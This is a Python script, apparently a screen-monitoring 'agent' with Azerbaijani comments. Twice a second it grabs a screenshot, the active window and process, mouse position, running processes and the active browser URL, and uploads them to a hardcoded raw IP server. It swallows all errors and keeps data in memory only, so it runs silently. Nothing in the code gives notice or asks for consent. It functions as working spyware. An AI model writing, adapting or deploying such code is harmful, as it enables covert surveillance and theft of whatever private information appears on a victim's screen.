import time
import io
import socket
try:
    import psutil
except ImportError:
    psutil = None

try:
    import requests
except ImportError:
    requests = None

import traceback

# Screenshot support
try:
    from PIL import ImageGrab
except:
    ImageGrab = None

try:
    import win32api
except ImportError:
    win32api = None

try:
    import win32gui
    import win32process
except ImportError:
    win32gui = None
    win32process = None

try:
    from pywinauto import Desktop
except ImportError:
    Desktop = None

SERVER_URL = "http://88.222.221.40:5050/upload"
UPLOAD_TOKEN = "BURAYA_SERVER_ENV_UPLOAD_TOKEN_YAZILACAQ"
REQUEST_TIMEOUT = 10
JPEG_QUALITY = 40
PC_NAME = socket.gethostname()
# 0.5 saniyəlik interval (saniyədə 2 dəfə)
INTERVAL_SECONDS = 0.5
BROWSER_PROCESSES = {
    "chrome.exe",
    "msedge.exe",
    "firefox.exe",
    "brave.exe",
    "opera.exe",
}

# =========================
#  UNIVERSAL SCREENSHOT
# =========================
def take_screenshot():
    try:
        if ImageGrab:
            return ImageGrab.grab()
        else:
            import pyscreenshot as ImageShot
            return ImageShot.grab()
    except Exception:
        try:
            import pyscreenshot as ImageShot
            return ImageShot.grab()
        except:
            return None

# =========================
#   ACTIVE WINDOW
# =========================
def get_active_window_info():
    if not win32gui or not win32process:
        return None, None

    try:
        hwnd = win32gui.GetForegroundWindow()
        if hwnd == 0:
            return None, None
        title = win32gui.GetWindowText(hwnd)
        tid, pid = win32process.GetWindowThreadProcessId(hwnd)
        try:
            proc = psutil.Process(pid).name() if psutil else "UNKNOWN"
        except:
            proc = "UNKNOWN"
        return title, proc
    except:
        return None, None

# =========================
#   MOUSE METADATA
# =========================
def get_mouse_info():
    if not win32api:
        return None, None, None, None

    try:
        x, y = win32api.GetCursorPos()
        screen_width = win32api.GetSystemMetrics(0)
        screen_height = win32api.GetSystemMetrics(1)
        return x, y, screen_width, screen_height
    except Exception:
        return None, None, None, None

# =========================
#   PROCESS LIST
# =========================
def get_running_processes():
    running = []
    if not psutil:
        return []

    try:
        for proc in psutil.process_iter(["name"]):
            try:
                name = proc.info.get("name")
                if name:
                    running.append(name)
            except Exception:
                continue
    except Exception:
        return []
    return running

# =========================
#   ACTIVE BROWSER URL
# =========================
def get_active_browser_url(active_process):
    if not active_process or active_process.lower() not in BROWSER_PROCESSES:
        return ""
    if not Desktop or not win32gui:
        return ""

    try:
        hwnd = win32gui.GetForegroundWindow()
        if hwnd == 0:
            return ""

        window = Desktop(backend="uia").window(handle=hwnd)
        edit_controls = window.descendants(control_type="Edit")
        for control in edit_controls:
            active_url = ""
            try:
                active_url = control.get_value()
            except Exception:
                try:
                    active_url = control.window_text()
                except Exception:
                    active_url = ""

            active_url = (active_url or "").strip()
            if active_url.startswith(("http://", "https://")):
                return active_url
    except Exception:
        return ""

    return ""

# =========================
#   SEND (RAM BASED)
# =========================
def send_screenshot():
    if not requests:
        return

    img = take_screenshot()
    if img is None:
        return

    # Şəkli birbaşa RAM-a (BytesIO) yazırıq
    buf = io.BytesIO()

    try:
        img.save(buf, format="JPEG", quality=JPEG_QUALITY)
        buf.seek(0)

        active_title, active_process = get_active_window_info()
        mouse_x, mouse_y, screen_width, screen_height = get_mouse_info()
        active_url = get_active_browser_url(active_process)
        running = get_running_processes()

        data = {
            "pc_name": PC_NAME,
            "active_window": active_title or "",
            "active_process": active_process or "",
            "process_list": ",".join(running),
            "mouse_x": str(mouse_x or ""),
            "mouse_y": str(mouse_y or ""),
            "screen_width": str(screen_width or ""),
            "screen_height": str(screen_height or ""),
            "active_url": active_url or "",
        }

        files = {"screenshot": ("screen.jpg", buf, "image/jpeg")}

        headers = {
            "X-Upload-Token": UPLOAD_TOKEN
        }

        requests.post(
            SERVER_URL,
            data=data,
            files=files,
            headers=headers,
            timeout=REQUEST_TIMEOUT
        )
    except:
        pass
    finally:
        buf.close()

# =========================
#   MAIN
# =========================
def main():
    print("Agent started (RAM-only mode) →", PC_NAME)
    while True:
        send_screenshot()
        time.sleep(INTERVAL_SECONDS)

if __name__ == "__main__":
    main()
